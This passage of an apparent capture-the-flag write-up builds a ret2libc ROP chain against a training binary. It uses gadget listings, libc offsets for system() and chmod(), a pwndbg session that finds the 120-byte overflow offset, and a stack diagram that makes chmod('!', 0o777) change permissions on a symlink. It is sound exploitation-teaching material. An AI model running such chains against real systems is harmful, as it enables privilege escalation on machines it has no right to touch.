0x0000000000401c54 : add byte ptr [rax + 0x29], cl ; ror dword ptr [rax - 0x77], 1 ; retf 0x148
0x000000000040158f : add byte ptr [rax - 0x39], cl ; clc ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401628
0x0000000000401524 : add byte ptr [rax - 0x77], cl ; iretd
0x0000000000401522 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; iretd
0x0000000000401312 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401490
0x0000000000401dfc : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401314 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401490
0x0000000000401594 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401628
0x000000000040165f : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40168f
0x00000000004016dd : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401706
0x0000000000401d87 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x0000000000401d88 : add byte ptr [rax], al ; add cl, cl ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x000000000040129a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401dfe : add byte ptr [rax], al ; endbr64 ; ret
0x00000000004011fc : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
0x0000000000401316 : add byte ptr [rax], al ; jmp 0x401490
0x0000000000401596 : add byte ptr [rax], al ; jmp 0x401628
0x0000000000401661 : add byte ptr [rax], al ; jmp 0x40168f
0x00000000004016df : add byte ptr [rax], al ; jmp 0x401706
0x0000000000401d89 : add byte ptr [rax], al ; leave ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x000000000040129b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401299 : add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401d8a : add cl, cl ; ret
0x000000000040122a : add dil, dil ; loopne 0x401295 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x000000000040129c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040130f : add eax, 0x2d98 ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401490
0x0000000000401297 : add eax, 0x2e0b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004016a7 : add eax, 0xc9fffffb ; ret
0x0000000000401085 : add eax, 0xf2000000 ; jmp 0x401020
0x0000000000401c61 : add ecx, dword ptr [rax - 0x77] ; ret 0x458b
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x0000000000401c52 : and al, 0 ; add byte ptr [rax + 0x29], cl ; ror dword ptr [rax - 0x77], 1 ; retf 0x148
0x0000000000401ba6 : and eax, 0x29480000 ; ret 0x8948
0x0000000000401717 : call qword ptr [rax + 0xff3c3c9]
0x00000000004014ac : call qword ptr [rax - 0x179a72b8]
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x0000000000401593 : clc ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401628
0x00000000004016dc : cld ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401706
0x00000000004012b3 : cli ; jmp 0x401240
0x0000000000401203 : cli ; ret
0x0000000000401e0b : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401310 : cwde ; sub eax, 0 ; add byte ptr [rax], al ; jmp 0x401490
0x00000000004016aa : dec ecx ; ret
0x00000000004012b0 : endbr64 ; jmp 0x401240
0x0000000000401200 : endbr64 ; ret
0x0000000000401ddc : fisttp word ptr [rax - 0x7d] ; ret
0x000000000040165e : hlt ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40168f
0x00000000004011fe : hlt ; nop ; endbr64 ; ret
0x00000000004016d9 : inc edi ; cld ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401706
0x000000000040165b : inc edi ; hlt ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40168f
0x0000000000401527 : iretd
0x0000000000401012 : je 0x401016 ; call rax
0x0000000000401225 : je 0x401230 ; mov edi, 0x404090 ; jmp rax
0x0000000000401267 : je 0x401270 ; mov edi, 0x404090 ; jmp rax
0x000000000040103a : jmp 0x401020
0x00000000004012b4 : jmp 0x401240
0x0000000000401318 : jmp 0x401490
0x0000000000401598 : jmp 0x401628
0x0000000000401663 : jmp 0x40168f
0x0000000000401649 : jmp 0x401695
0x00000000004014ef : jmp 0x4016ab
0x00000000004016e1 : jmp 0x401706
0x000000000040100b : jmp 0x4840103f
0x000000000040122c : jmp rax
0x00000000004014af : lea esp, [rbp - 0x18] ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x00000000004016ab : leave ; ret
0x000000000040122d : loopne 0x401295 ; nop ; ret
0x0000000000401296 : mov byte ptr [rip + 0x2e0b], 1 ; pop rbp ; ret
0x000000000040165c : mov dword ptr [rbp - 0xc], 0 ; jmp 0x40168f
0x00000000004016da : mov dword ptr [rbp - 4], 0 ; jmp 0x401706
0x0000000000401591 : mov dword ptr [rbp - 8], 0 ; jmp 0x401628
0x0000000000401d86 : mov eax, 0 ; leave ; ret
0x0000000000401227 : mov edi, 0x404090 ; jmp rax
0x0000000000401590 : mov qword ptr [rbp - 8], 0 ; jmp 0x401628
0x0000000000401228 : nop ; add dil, dil ; loopne 0x401295 ; nop ; ret
0x00000000004011ff : nop ; endbr64 ; ret
0x0000000000401718 : nop ; leave ; ret
0x0000000000401b48 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401b49 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401b4a : nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401b4b : nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401b4c : nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401b4d : nop ; nop ; nop ; pop rbp ; ret
0x0000000000401b4e : nop ; nop ; pop rbp ; ret
0x0000000000401b4f : nop ; pop rbp ; ret
0x000000000040122f : nop ; ret
0x00000000004012ac : nop dword ptr [rax] ; endbr64 ; jmp 0x401240
0x0000000000401226 : or dword ptr [rdi + 0x404090], edi ; jmp rax
0x0000000000401298 : or ebp, dword ptr [rsi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401dec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004014b3 : pop r12 ; pop r13 ; pop rbp ; ret
0x0000000000401dee : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004014b5 : pop r13 ; pop rbp ; ret
0x0000000000401df0 : pop r14 ; pop r15 ; ret
0x0000000000401df2 : pop r15 ; ret
0x0000000000401deb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401def : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004014b6 : pop rbp ; pop rbp ; ret
0x000000000040129d : pop rbp ; ret
0x00000000004014b2 : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x0000000000401df3 : pop rdi ; ret
0x0000000000401df1 : pop rsi ; pop r15 ; ret
0x0000000000401ded : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004014b4 : pop rsp ; pop r13 ; pop rbp ; ret
0x000000000040101a : ret
0x000000000040151f : ret 0x40be
0x0000000000401c64 : ret 0x458b
0x0000000000401bab : ret 0x8948
0x0000000000401cb4 : ret 0x8b48
0x00000000004014cf : ret 0x8be
0x0000000000401c5a : retf 0x148
0x0000000000401cb1 : rol byte ptr [rcx], 0x89 ; ret 0x8b48
0x0000000000401c57 : ror dword ptr [rax - 0x77], 1 ; retf 0x148
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x0000000000401311 : sub eax, 0 ; add byte ptr [rax], al ; jmp 0x401490
0x00000000004011fb : sub eax, 0x90f40000 ; endbr64 ; ret
0x0000000000401e0d : sub esp, 8 ; add rsp, 8 ; ret
0x0000000000401e0c : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x0000000000401223 : test eax, eax ; je 0x401230 ; mov edi, 0x404090 ; jmp rax
0x0000000000401265 : test eax, eax ; je 0x401270 ; mov edi, 0x404090 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax

Unique gadgets found: 131
```

- [ ] Offset between buffer and stored return address to `main()`
- [ ] Location of a NULL terminated string
- [ ] Offsets of required Libc functions
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x401df3`
   - `pop rsi ; pop r15 ; ret`: `0x401df1`

As expected, there is no syscall gadget.
Since the challenge program leaks the address of `system()` within Libc, we can call the necessary the Libc functions directly instead.

#### Libc functions

Let's first the offset `system()` within Libc from the base address of the Libc.

```
hacker@return-oriented-programming~leaky-libc-easy:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
  1430: 0000000000052290    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
```

- [ ] Offset between buffer and stored return address to `main()`
- [ ] Location of a NULL terminated string
- [ ] Offsets of required Libc functions
   - Offset of `system()` within Libc: `0x52290`
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x401df3`
   - `pop rsi ; pop r15 ; ret`: `0x401df1`

Now that we can calculate the Libc base address given the leak, let's find the offset of the `chmod()` function within Libc.

```
hacker@return-oriented-programming~leaky-libc-easy:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "chmod"
   125: 000000000010ddb0    37 FUNC    WEAK   DEFAULT   15 fchmod@@GLIBC_2.2.5
   631: 000000000010dd80    37 FUNC    WEAK   DEFAULT   15 chmod@@GLIBC_2.2.5
  1015: 000000000010de00   108 FUNC    GLOBAL DEFAULT   15 fchmodat@@GLIBC_2.4
  2099: 000000000010dde0    24 FUNC    GLOBAL DEFAULT   15 lchmod@@GLIBC_2.3.2
```

- [ ] Offset between buffer and stored return address to `main()`
- [ ] Location of a NULL terminated string
- [x] Offsets of required Libc functions
   - Offset of `system()` within Libc: `0x52290`
   - Offset of `chmod()` within Libc: `0x10dd80`
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x401df3`
   - `pop rsi ; pop r15 ; ret`: `0x401df1`

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x0000000000401b52 <+0>:     endbr64
   0x0000000000401b56 <+4>:     push   rbp
   0x0000000000401b57 <+5>:     mov    rbp,rsp
   0x0000000000401b5a <+8>:     sub    rsp,0x90
   0x0000000000401b61 <+15>:    mov    DWORD PTR [rbp-0x74],edi
   0x0000000000401b64 <+18>:    mov    QWORD PTR [rbp-0x80],rsi
   0x0000000000401b68 <+22>:    mov    QWORD PTR [rbp-0x88],rdx
   0x0000000000401b6f <+29>:    lea    rdi,[rip+0x622]        # 0x402198
   0x0000000000401b76 <+36>:    call   0x401120 <puts@plt>
   0x0000000000401b7b <+41>:    lea    rdi,[rip+0x68e]        # 0x402210
   0x0000000000401b82 <+48>:    call   0x401120 <puts@plt>
   0x0000000000401b87 <+53>:    mov    rax,rsp
   0x0000000000401b8a <+56>:    mov    QWORD PTR [rip+0x254f],rax        # 0x4040e0 <sp_>
   0x0000000000401b91 <+63>:    mov    rax,rbp
   0x0000000000401b94 <+66>:    mov    QWORD PTR [rip+0x2525],rax        # 0x4040c0 <bp_>
   0x0000000000401b9b <+73>:    mov    rdx,QWORD PTR [rip+0x251e]        # 0x4040c0 <bp_>
   0x0000000000401ba2 <+80>:    mov    rax,QWORD PTR [rip+0x2537]        # 0x4040e0 <sp_>
   0x0000000000401ba9 <+87>:    sub    rdx,rax
   0x0000000000401bac <+90>:    mov    rax,rdx
   0x0000000000401baf <+93>:    shr    rax,0x3
   0x0000000000401bb3 <+97>:    add    rax,0x2
   0x0000000000401bb7 <+101>:   mov    QWORD PTR [rip+0x2512],rax        # 0x4040d0 <sz_>
   0x0000000000401bbe <+108>:   mov    rax,QWORD PTR [rip+0x24fb]        # 0x4040c0 <bp_>
   0x0000000000401bc5 <+115>:   add    rax,0x8
   0x0000000000401bc9 <+119>:   mov    QWORD PTR [rip+0x2508],rax        # 0x4040d8 <rp_>
   0x0000000000401bd0 <+126>:   lea    rdi,[rip+0x6a1]        # 0x402278
   0x0000000000401bd7 <+133>:   call   0x401120 <puts@plt>
   0x0000000000401bdc <+138>:   lea    rdi,[rip+0x6d5]        # 0x4022b8
   0x0000000000401be3 <+145>:   mov    eax,0x0
   0x0000000000401be8 <+150>:   call   0x401140 <printf@plt>
   0x0000000000401bed <+155>:   lea    rdi,[rip+0x6fc]        # 0x4022f0
   0x0000000000401bf4 <+162>:   call   0x401120 <puts@plt>
   0x0000000000401bf9 <+167>:   lea    rdi,[rip+0x740]        # 0x402340
   0x0000000000401c00 <+174>:   call   0x401120 <puts@plt>
   0x0000000000401c05 <+179>:   lea    rsi,[rip+0x756]        # 0x402362
   0x0000000000401c0c <+186>:   mov    rdi,0xffffffffffffffff
   0x0000000000401c13 <+193>:   call   0x4011c0 <dlsym@plt>
   0x0000000000401c18 <+198>:   mov    rsi,rax
   0x0000000000401c1b <+201>:   lea    rdi,[rip+0x74e]        # 0x402370
   0x0000000000401c22 <+208>:   mov    eax,0x0
   0x0000000000401c27 <+213>:   call   0x401140 <printf@plt>
   0x0000000000401c2c <+218>:   lea    rax,[rbp-0x70]
   0x0000000000401c30 <+222>:   mov    edx,0x1000
   0x0000000000401c35 <+227>:   mov    rsi,rax
   0x0000000000401c38 <+230>:   mov    edi,0x0
   0x0000000000401c3d <+235>:   call   0x401150 <read@plt>
   0x0000000000401c42 <+240>:   mov    DWORD PTR [rbp-0x4],eax
   0x0000000000401c45 <+243>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000401c48 <+246>:   cdqe
   0x0000000000401c4a <+248>:   lea    rcx,[rbp-0x70]
   0x0000000000401c4e <+252>:   mov    rdx,QWORD PTR [rip+0x2483]        # 0x4040d8 <rp_>
   0x0000000000401c55 <+259>:   sub    rcx,rdx
   0x0000000000401c58 <+262>:   mov    rdx,rcx
   0x0000000000401c5b <+265>:   add    rax,rdx
   0x0000000000401c5e <+268>:   shr    rax,0x3
   0x0000000000401c62 <+272>:   mov    rdx,rax
   0x0000000000401c65 <+275>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000401c68 <+278>:   mov    esi,eax
   0x0000000000401c6a <+280>:   lea    rdi,[rip+0x737]        # 0x4023a8
   0x0000000000401c71 <+287>:   mov    eax,0x0
   0x0000000000401c76 <+292>:   call   0x401140 <printf@plt>
   0x0000000000401c7b <+297>:   lea    rdi,[rip+0x75e]        # 0x4023e0
   0x0000000000401c82 <+304>:   call   0x401120 <puts@plt>
   0x0000000000401c87 <+309>:   lea    rdi,[rip+0x7ba]        # 0x402448
   0x0000000000401c8e <+316>:   call   0x401120 <puts@plt>
   0x0000000000401c93 <+321>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000401c96 <+324>:   cdqe
   0x0000000000401c98 <+326>:   lea    rcx,[rbp-0x70]
   0x0000000000401c9c <+330>:   mov    rdx,QWORD PTR [rip+0x2435]        # 0x4040d8 <rp_>
   0x0000000000401ca3 <+337>:   sub    rcx,rdx
   0x0000000000401ca6 <+340>:   mov    rdx,rcx
   0x0000000000401ca9 <+343>:   add    rax,rdx
   0x0000000000401cac <+346>:   shr    rax,0x3
   0x0000000000401cb0 <+350>:   add    eax,0x1
   0x0000000000401cb3 <+353>:   mov    edx,eax
   0x0000000000401cb5 <+355>:   mov    rax,QWORD PTR [rip+0x241c]        # 0x4040d8 <rp_>
   0x0000000000401cbc <+362>:   mov    esi,edx
   0x0000000000401cbe <+364>:   mov    rdi,rax
   0x0000000000401cc1 <+367>:   call   0x4016ad <print_chain>
   0x0000000000401cc6 <+372>:   lea    rdi,[rip+0x7bd]        # 0x40248a
   0x0000000000401ccd <+379>:   call   0x401120 <puts@plt>
   0x0000000000401cd2 <+384>:   nop
   0x0000000000401cd3 <+385>:   leave
   0x0000000000401cd4 <+386>:   ret
End of assembler dump.
```

Let's set a breakpoint at `challenge+235` and run.

```
pwndbg> break *(challenge+235)
Breakpoint 1 at 0x401c3d
```

```
pwndbg> run
Starting program: /challenge/leveraging-libc-easy 
###
### Welcome to /challenge/leveraging-libc-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

ASLR means that the address of the libraries is not known,
but I will simulate a memory disclosure of libc.By knowing where libc is, you can now utilize the HUMONGOUS amount of gadgets
present in it for your ROP chain.
[LEAK] The address of "system" in libc is: 0x717360cbb290.


Breakpoint 1, 0x0000000000401c3d in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────────────
 RAX  0x7ffd64369ec0 —▸ 0x717360e566a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
 RBX  0x401d90 (__libc_csu_init) ◂— endbr64 
 RCX  0
 RDX  0x1000
 RDI  0
 RSI  0x7ffd64369ec0 —▸ 0x717360e566a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
 R8   0x3c
 R9   0x3c
 R10  0x40239d ◂— 0xa0a2e /* '.\n\n' */
 R11  0x246
 R12  0x4011d0 (_start) ◂— endbr64 
 R13  0x7ffd6436a050 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffd64369f30 —▸ 0x7ffd64369f60 ◂— 0
 RSP  0x7ffd64369ea0 ◂— 0xd68 /* 'h\r' */
 RIP  0x401c3d (challenge+235) ◂— call read@plt
─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x401c3d <challenge+235>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7ffd64369ec0 —▸ 0x717360e566a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
        nbytes: 0x1000
 
   0x401c42 <challenge+240>    mov    dword ptr [rbp - 4], eax
   0x401c45 <challenge+243>    mov    eax, dword ptr [rbp - 4]
   0x401c48 <challenge+246>    cdqe   
   0x401c4a <challenge+248>    lea    rcx, [rbp - 0x70]
   0x401c4e <challenge+252>    mov    rdx, qword ptr [rip + 0x2483]     RDX, [rp_]
   0x401c55 <challenge+259>    sub    rcx, rdx
   0x401c58 <challenge+262>    mov    rdx, rcx
   0x401c5b <challenge+265>    add    rax, rdx
   0x401c5e <challenge+268>    shr    rax, 3
   0x401c62 <challenge+272>    mov    rdx, rax
──────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffd64369ea0 ◂— 0xd68 /* 'h\r' */
01:0008│-088     0x7ffd64369ea8 —▸ 0x7ffd6436a068 —▸ 0x7ffd6436a68e ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-080     0x7ffd64369eb0 —▸ 0x7ffd6436a058 —▸ 0x7ffd6436a66e ◂— '/challenge/leveraging-libc-easy'
03:0018│-078     0x7ffd64369eb8 ◂— 0x10000000a /* '\n' */
04:0020│ rax rsi 0x7ffd64369ec0 —▸ 0x717360e566a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
05:0028│-068     0x7ffd64369ec8 —▸ 0x404090 (stdout@@GLIBC_2.2.5) —▸ 0x717360e566a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
06:0030│-060     0x7ffd64369ed0 —▸ 0x717360c66740 ◂— 0x717360c66740
07:0038│-058     0x7ffd64369ed8 ◂— 0
────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x401c3d challenge+235
   1         0x401d7a main+165
   2   0x717360c8d083 __libc_start_main+243
   3         0x4011fe _start+46
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Lets get the address of the stored return pointer.

```
pwndbg> info frame
Stack level 0, frame at 0x7ffd64369f40:
 rip = 0x401c3d in challenge; saved rip = 0x401d7a
 called by frame at 0x7ffd64369f70
 Arglist at 0x7ffd64369f30, args: 
 Locals at 0x7ffd64369f30, Previous frame's sp is 0x7ffd64369f40
 Saved registers:
  rbp at 0x7ffd64369f30, rip at 0x7ffd64369f38
```

```
pwndbg> p/d 0x7ffd64369f38 - 0x7ffd64369ec0
$1: 120
```

- [x] Offset between buffer and stored return address to `main()`: `120`
   - Location of the buffer: `0x7ffd64369ec0`
   - location of the stored return pointer to `main()`: `0x7ffd64369f38`
- [ ] Location of a NULL terminated string
- [x] Offsets of required Libc functions
   - Offset of `system()` within Libc: `0x52290`
   - Offset of `chmod()` within Libc: `0x10dd80`
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x401df3`
   - `pop rsi ; pop r15 ; ret`: `0x401df1`

Let's find a string we can use a symlink.

```
hacker@return-oriented-programming~leaky-libc-easy:/$ objdump -s -j .rodata /challenge/leveraging-libc-easy | grep -E "[0-9a-f]{2}00"
 402000 01000200 00000000 2b2d2d2d 2d2d2d2d  ........+-------
 402050 2d2d2d2d 2d2d2d2d 2d2b0044 61746120  ---------+.Data 
 402070 79746573 29005374 61636b20 6c6f6361  ytes).Stack loca
 402090 3373207c 20253138 73207c0a 00000000  3s | %18s |.....
 4020e0 78207c20 30782530 31366c78 207c0a00  x | 0x%016lx |..
 402100 6c657220 6661696c 65642074 6f20696e  ler failed to in
 402110 69746961 6c697a65 2e007c20 30782530  itialize..| 0x%0
 402120 31366c78 3a200028 554e4d41 50504544  16lx: .(UNMAPPED
 402140 20007265 74006361 6c6c0028 44495341   .ret.call.(DISA
 402150 5353454d 424c5920 4552524f 52292000  SSEMBLY ERROR) .
 402160 25303268 68782000 0a2b2d2d 2d205072  %02hhx ..+--- Pr
 402190 61742025 702e0a00 54686973 20636861  at %p...This cha
 402200 20746869 73207365 72696573 206f6600   this series of.
 402270 00000000 00000000 41534c52 206d6561  ........ASLR mea
 4022b0 6e2c0000 00000000 62757420 49207769  n,......but I wi
 4022e0 6f66206c 6962632e 00000000 00000000  of libc.........
 402300 206c6962 63206973 2c20796f 75206361   libc is, you ca
 402330 6e74206f 66206761 64676574 73000000  nt of gadgets...
 402360 2e007379 7374656d 00000000 00000000  ..system........
 4023a0 00000000 00000000 52656365 69766564  ........Received
 4023d0 64206761 64676574 732e0a00 00000000  d gadgets.......
 402400 204e6f74 65207468 61742077 65206861   Note that we ha
 402440 626c6500 00000000 66726f6d 20776974  ble.....from wit
 402480 796f7572 73656c66 2e004c65 6176696e  yourself..Leavin
 402490 67210023 23230023 23232057 656c636f  g!.###.### Welco
 4024a0 6d652074 6f202573 210a0023 23232047  me to %s!..### G
 4024b0 6f6f6462 79652100                    oodbye!.  
```

- [x] Offset between buffer and stored return address to `main()`: `120`
   - Location of the buffer: `0x7ffd64369ec0`
   - location of the stored return pointer to `main()`: `0x7ffd64369f38`
- [x] Location of a NULL terminated string: `0x402491`
- [x] Offsets of required Libc functions
   - Offset of `system()` within Libc: `0x52290`
   - Offset of `chmod()` within Libc: `0x10dd80`
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x401df3`
   - `pop rsi ; pop r15 ; ret`: `0x401df1`


### ROP chain: ret2libc

This is what the ROP chain would look like.

```
<== Value is stored at the address
<-- Points to the address

═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
            0x7ffd64369ec0 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c20 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rsp --> 0x7ffd64369f38 │  00 00 00 00 00 40 1d f3  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd64369f40 │  00 00 00 00 00 40 24 91  │ --> ( b"!\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd64369f48 │  00 00 00 00 00 40 1d f1  │ --> ( pop rsi ; pop r15 ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd64369f50 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd64369f58 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd64369f60 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> challenge() return
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffd64369f40 │  00 00 00 00 00 40 24 91  │ --> ( b"!\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd64369f48 │  00 00 00 00 00 40 1d f1  │ --> ( pop rsi ; pop r15 ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd64369f50 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd64369f58 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd64369f60 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rdi ; ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffd64369f48 │  00 00 00 00 00 40 1d f1  │ --> ( pop rsi ; pop r15 ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd64369f50 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd64369f58 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd64369f60 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x402491

Function call setup:
chmod("!")

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffd64369f50 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd64369f58 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd64369f60 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x402491

Function call setup:
chmod("!")

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rsi ; pop r15 ; ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffd64369f58 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd64369f60 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x402491
rsi: 0x1ff

Function call setup:
chmod("!", 0o777)

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop r15 ; ret
